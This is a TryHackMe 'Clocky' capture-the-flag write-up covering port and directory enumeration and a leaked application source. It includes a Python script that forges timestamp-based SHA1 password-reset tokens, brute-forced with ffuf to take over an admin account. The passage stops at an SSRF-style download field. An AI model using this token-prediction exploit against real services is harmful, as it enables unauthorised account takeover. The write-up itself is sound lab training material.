---
title: THM Clocky Writeup
date: 2024-03-31 06:42 -0400
categories: [Writeups, TryHackMe]
tags: [clocky, ctf]
---

# Intro
We know we have to find 6 flags, lets see where we can get them from.

## Enumeration
I started off with a simple nmap scan using the `--top-ports` flag, I like this as it is pretty good at finding open and used ports.
```terminal
nmap -sC -sV --top-ports=4000 10.10.149.202
```
We see there are a few services running,
```terminal
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
8000/tcp open  http       nginx 1.18.0 (Ubuntu)
| http-robots.txt: 3 disallowed entries 
|_/*.sql$ /*.zip$ /*.bak$
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 403 Forbidden
8080/tcp open  http-proxy Werkzeug/2.2.3 Python/3.8.10
---SHORTENED---
```
Let's look into the port 8000, as the robots.txt has some disallowed entries, always interesting to look where you aren't supposed to!

## First Flag
```terminal
User-agent: *
Disallow: /*.sql$
Disallow: /*.zip$
Disallow: /*.bak$

Flag 1: THM{REDACTED}
```
We find our first flag at the robots.txt on port 8000
![website-screenshot](assets/img/writeupscreenshots/clocky-1.png)
Let's start some enumeration for those other file types mentioned
```terminal
gobuster dir -u http://10.10.149.202:8000/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x sql,zip,bak
```
```terminal
/index.zip (Status: 200)
```
## Second Flag
Looks like we have at least one file, let us download to investigate. Inside our zip file we have a python application and our second flag! It looks like the password_reset page may be vulnerable as it shows us how the user tokens are made in order to reset account passwords successfully. Now we must focus on finding a valid user to exploit this!

```python
import requests, hashlib
from datetime import datetime, timedelta

username = input("What user to attempt?: ")
lnk2 = " . " + username.upper()

forg_pass_url = "http://10.10.149.202:8080/forgot_password"
data = {
    'username': username.lower()
}
response = requests.post(forg_pass_url, data=data)

lnk1 = str(datetime.now() - timedelta(hours=1))[:-4]
given_str = lnk1

# Convert the string to a datetime object
dt = datetime.strptime(given_str, "%Y-%m-%d %H:%M:%S.%f")

# Generate milliseconds variations
milliseconds = [str(i).zfill(2) for i in range(100)]

# Initialize the list to store the results
result = []

# Generate combinations with a second before and after
for ms in milliseconds:
    result.append((dt - timedelta(seconds=1)).strftime("%Y-%m-%d %H:%M:%S.") + ms)
    result.append(dt.strftime("%Y-%m-%d %H:%M:%S.") + ms)
    result.append((dt + timedelta(seconds=1)).strftime("%Y-%m-%d %H:%M:%S.") + ms)

for i in result:
	lnk_full = i + lnk2
	#print(lnk_full) - Before hash to check time is correct
	lnk_full = hashlib.sha1(lnk_full.encode("utf-8")).hexdigest()
	print(lnk_full)

```
I created this to automate the testing of the tokens with different users... I finally stumbled upon the correct user by using ffuf to bruteforce the attempts.
```terminal
68bc6b929e90730d32c4d7389ec1f32edd607493 [Status: 200, Size: 22, Words: 2, Lines: 1]
2d6488a9bfc91cdf33c893ae385de34a2451783f [Status: 200, Size: 22, Words: 2, Lines: 1]
e7248212ac85850f8f775080a9ddcbd71acab755 [Status: 200, Size: 22, Words: 2, Lines: 1]
6c57c9bb4d825648944f2c58ab6753e9045604ff [Status: 200, Size: 22, Words: 2, Lines: 1]
56a0e32d21173b7079375143d7436da84ffbc3f4 [Status: 200, Size: 22, Words: 2, Lines: 1]
f93edc58cfa5f00e0c49dcd72eaead6af99a89b6 [Status: 200, Size: 22, Words: 2, Lines: 1]
f0641a0a77c9d4637ab3fa449da9e16b20e8bd6f [Status: 200, Size: 22, Words: 2, Lines: 1]
c7b0c9601d1cdda599282787efaed39b0305cc9f [Status: 200, Size: 22, Words: 2, Lines: 1]
fa3881a93441fe12b54b18f2115110f38e9f2ef2 [Status: 200, Size: 22, Words: 2, Lines: 1]
0dd5370d4f3bba5482e7e3d701b41ba6cf275bd0 [Status: 200, Size: 1627, Words: 665, Lines: 54]
```
## Third Flag
We can see this token worked, leading us to the password reset page where we can define our own password. After doing so, heading to the administrator page gives us our third flag!
![website-screenshot](assets/img/writeupscreenshots/clocky-2.png)

Here we are prompted with a input to enter a "location" and a download button. From some quick testing, we are able to make requests through the site to download files. Using localhost or 127.0.0.1 over http was not allowed, we need another way to exploit this.